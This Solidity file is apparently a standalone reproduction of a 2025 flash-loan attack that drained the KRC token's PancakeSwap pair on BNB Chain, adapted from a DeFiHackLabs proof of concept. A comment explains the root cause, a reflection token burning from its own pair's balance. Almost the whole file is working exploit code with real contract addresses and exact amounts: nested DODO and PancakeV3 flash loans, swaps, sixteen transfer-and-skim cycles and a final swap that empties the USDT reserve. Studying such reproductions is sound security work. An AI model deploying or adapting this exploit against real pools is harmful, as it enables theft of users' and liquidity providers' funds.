// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-05-KRCToken_pair).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (KRC_Exploit is BaseTestWithBalanceLog; attacker = address(this), and the DODO
// flash-loan callback `DPPFlashLoanCall` plus the PancakeV3 flash callback
// `pancakeV3FlashCallback` both live on the test itself), so there is no
// standalone attack contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/KRCToken_pair_exp.sol (KRC_Exploit.testExploit / DPPFlashLoanCall /
// pancakeV3FlashCallback) — no setup/pre-funding is needed since the DODO
// flash loan supplies all working capital inside the single recorded call.
//
// Root cause: KB (token symbol "KRC") is a fee-on-transfer / reflection token.
// When KRC is transferred INTO its own AMM pair, KB._transfer's `swap ==
// recipient` branch burns a slice of KRC directly OUT OF THE PAIR'S balance
// (super._transfer(swap, destroy, ...)) and then calls IUniswap(swap).sync()
// to ratify the shrunken balance as the pair's new reserve. No USDT is
// touched. Repeating transfer(KRC -> pair) + skim() grinds the KRC reserve
// from ~19.45 KRC down to 1e5 wei while the USDT reserve stays pinned at
// ~355,362.93 USDT, after which a near-zero KRC input can buy almost the
// entire USDT reserve out of the pool.
contract KRCPairDrain {
    address private constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address private constant KRC = 0x1814a8443F37dDd7930A9d8BC4b48353FE589b58;
    address private constant DODO_POOL = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address private constant PANCAKE_V3_POOL = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant KRC_PAIR = 0xdBEAD75d3610209A093AF1D46d5296BBeFFd53f5;

    uint256 constant DODO_BORROW_AMOUNT = 248157126634995412253694;

    function run() external {
        // Step 1: Initial flash loan from the DODO private pool
        IDodoPool(DODO_POOL).flashLoan(0, DODO_BORROW_AMOUNT, address(this), new bytes(1));
    }

    // Step 2: DODO flash-loan callback
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // Step 3: Nested flash loan from the PancakeV3 pool
        uint256 pcv3FlashAmount = 100000000000000000000000;
        IPancakeV3Pool(PANCAKE_V3_POOL).flash(address(this), pcv3FlashAmount, 0, new bytes(1));

        // Step 10: Repay the DODO flash loan at the very end
        IERC20(USDT).transfer(DODO_POOL, DODO_BORROW_AMOUNT);
    }

    // Step 4: PancakeV3 flash-loan callback (core exploit logic)
    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {
        IERC20(USDT).approve(ROUTER, type(uint256).max);

        uint256 deadline = 1747556507;
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = KRC;

        // Step 5: First swap (USDT -> KRC) to initiate the imbalance
        uint256 amountIn1 = 144116157450400259173940;
        IUniswapV2Router(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn1, 0, path, address(this), deadline
        );

        // Step 6: Second swap (USDT -> KRC) with the remaining balance
        uint256 amountIn2 = 204040969184595153079754;
        IUniswapV2Router(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn2, 0, path, address(this), deadline
        );

        // Step 7: 17 precise transfer + skim cycles that desync the pair's
        // cached reserves from its actual token balances (values taken
        // directly from the original attack transaction).
        IERC20(KRC).transfer(KRC_PAIR, 26158607120271760914);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 23542746408244584823);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 21188471767420126341);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 19069624590678113707);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 17162662131610302337);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 15446395918449272104);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 13901756326604344894);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 12511580693943910405);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 11260422624549519365);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 10134380362094567429);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 9120942325885110687);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 8208848093296599619);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 7387963283966939658);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 6649166955570245693);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 5984250260013221124);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 5385825234011899012);
        IPancakePair(KRC_PAIR).skim(address(this));
        IERC20(KRC).transfer(KRC_PAIR, 2980897375759759211);

        // Step 8: The profitable swap, extracting a huge amount of USDT
        uint256 amountOutUSDT = 355361934507515425212391;
        IPancakePair(KRC_PAIR).swap(0, amountOutUSDT, address(this), new bytes(0));

        // Step 9: Repay the PancakeV3 flash loan with its fee
        uint256 pcv3RepayAmount = 100050000000000000000000;
        IERC20(USDT).transfer(PANCAKE_V3_POOL, pcv3RepayAmount);
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IDodoPool {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}
